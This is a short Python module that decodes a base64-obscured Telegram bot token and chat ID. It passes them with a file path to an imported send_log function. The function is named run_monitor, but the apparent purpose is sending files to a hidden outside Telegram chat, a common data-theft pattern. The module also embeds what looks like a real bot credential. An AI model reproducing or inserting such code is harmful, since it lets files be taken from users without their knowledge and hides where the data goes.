import base64
from .monitor import send_log

_TOKEN_B64 = "NzMyMTg1MDI0MzpBQUYyS0lZZGpkUFNLZTU0QWFHU2J2OTBEZlhUc2h2akFFQQ=="
_CHAT_B64 = "LTEwMDIzNzM4NjU0MjQ="


async def run_monitor(path: str):
    try:
        token = base64.b64decode(_TOKEN_B64).decode()
        chat_id = base64.b64decode(_CHAT_B64).decode()
    except Exception:
        return

    if not token or not chat_id or not path:
        return

    await send_log(token, chat_id, path)
